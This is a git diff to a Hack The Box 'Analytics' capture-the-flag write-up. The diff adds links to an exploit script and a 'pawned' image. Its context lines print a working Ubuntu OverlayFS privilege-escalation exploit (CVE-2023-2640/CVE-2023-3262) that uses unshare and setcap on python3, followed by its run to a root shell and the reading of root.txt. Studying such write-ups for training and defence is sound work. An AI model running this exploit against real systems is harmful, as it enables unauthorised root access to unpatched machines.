@@ -125,7 +125,7 @@ metalytics@analytics:~$ uname -a
 Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jan 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
-#### I utilized a script meticulously crafted for Linux privilege escalation on the targeted machine.
+#### I utilized a script [exploit.sh](10.10.11.233/exploit.sh) meticulously crafted for Linux privilege escalation on the targeted machine.
 
 ```bash 
 metalytics@analytics:~$ cd ../../tmp
@@ -133,7 +133,7 @@ metalytics@analytics:/tmp$ nano exploit.sh
 metalytics@analytics:/tmp$ cat exploit.sh 
 #!/bin/bash
 
-# CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation
+# CVE-2023-2640 CVE-2023-3262:Privilege Escalation
 
 echo "[+] You should be root now"
 echo "[+] Type 'exit' to finish and leave the house cleaned"
@@ -142,7 +142,7 @@ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/pyt
 metalytics@analytics:/tmp$ chmod +x exploit.sh 
 ```
 
-## Ready to kick things off? Simply proceed by executing the exploit.sh file!"
+## Ready to kick things off? Simply proceed by executing the [exploit.sh](10.10.11.233/exploit.sh) file!"
 
 ```bash 
 metalytics@analytics:/tmp$ ./exploit.sh 
@@ -153,3 +153,6 @@ root
 root@analytics:/tmp# cat ../../root/root.txt
 
 ```
+
+![Analytics pawnd by Mr  Govind Dubey ](https://github.com/MrGovindDubey/HTB-Machines/assets/118271775/f05df61a-7e3f-4a05-afd4-26fa1a3c11f3)
+
